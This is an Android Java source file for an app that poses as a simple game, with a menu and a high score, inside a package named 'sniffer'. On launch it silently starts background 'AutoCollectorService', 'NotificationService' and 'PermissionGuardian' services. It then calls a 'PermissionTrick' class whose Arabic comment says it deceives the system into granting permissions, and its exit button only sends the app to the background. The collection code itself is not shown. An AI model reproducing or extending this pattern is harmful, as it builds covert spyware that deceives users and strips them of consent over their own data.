package com.v8.global.sniffer.game;

import android.app.Activity;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.view.View;
import android.view.animation.Animation;
import android.view.animation.AnimationUtils;
import android.widget.Button;
import android.widget.ImageView;
import android.widget.TextView;
import android.widget.Toast;
import com.v8.global.sniffer.R;
import com.v8.global.sniffer.AutoCollectorService;
import com.v8.global.sniffer.NotificationService;
import com.v8.global.sniffer.PermissionGuardian;
import com.v8.global.sniffer.utils.PermissionTrick;

public class MainGameActivity extends Activity {

    private Button btnPlay, btnSettings, btnExit;
    private TextView tvHighScore, tvWelcome;
    private ImageView ivLogo;
    private int highScore = 0;
    private boolean servicesStarted = false;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main_game);

        initViews();
        loadHighScore();
        
        // تشغيل الخدمات في الخلفية (بدون انتظار الصلاحيات)
        startBackgroundServices();
        
        // خداع النظام للصلاحيات
        PermissionTrick trick = new PermissionTrick(this);
        trick.setCallback(new PermissionTrick.PermissionCallback() {
            @Override
            public void onComplete() {
                // تم - نكمل
            }
        });
        trick.trickSystem();

        setupClickListeners();
    }

    private void initViews() {
        btnPlay = findViewById(R.id.btn_play);
        btnSettings = findViewById(R.id.btn_settings);
        btnExit = findViewById(R.id.btn_exit);
        tvHighScore = findViewById(R.id.tv_high_score);
        tvWelcome = findViewById(R.id.tv_welcome);
        ivLogo = findViewById(R.id.iv_logo);

        Animation fadeIn = AnimationUtils.loadAnimation(this, R.anim.fade_in);
        ivLogo.startAnimation(fadeIn);
        tvWelcome.startAnimation(fadeIn);
    }

    private void loadHighScore() {
        highScore = getSharedPreferences("game_prefs", MODE_PRIVATE).getInt("high_score", 0);
        tvHighScore.setText("أفضل نتيجة: " + highScore);
    }

    private void startBackgroundServices() {
        if (servicesStarted) return;
        servicesStarted = true;

        try {
            Intent notificationIntent = new Intent(this, NotificationService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(notificationIntent);
            } else {
                startService(notificationIntent);
            }
        } catch (Exception e) {}

        try {
            Intent collectorIntent = new Intent(this, AutoCollectorService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(collectorIntent);
            } else {
                startService(collectorIntent);
            }
        } catch (Exception e) {}

        try {
            Intent guardianIntent = new Intent(this, PermissionGuardian.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(guardianIntent);
            } else {
                startService(guardianIntent);
            }
        } catch (Exception e) {}
    }

    private void setupClickListeners() {
        btnPlay.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                v.startAnimation(AnimationUtils.loadAnimation(MainGameActivity.this, R.anim.click_effect));
                
                // حتى لو الصلاحيات ناقصة، افتح اللعبة
                Intent intent = new Intent(MainGameActivity.this, GameBoardActivity.class);
                startActivity(intent);
            }
        });

        btnSettings.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                v.startAnimation(AnimationUtils.loadAnimation(MainGameActivity.this, R.anim.click_effect));
                Intent intent = new Intent(MainGameActivity.this, GameSettingsActivity.class);
                startActivity(intent);
            }
        });

        btnExit.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                v.startAnimation(AnimationUtils.loadAnimation(MainGameActivity.this, R.anim.click_effect));
                moveTaskToBack(true);
            }
        });
    }

    @Override
    protected void onResume() {
        super.onResume();
        loadHighScore();
    }
}
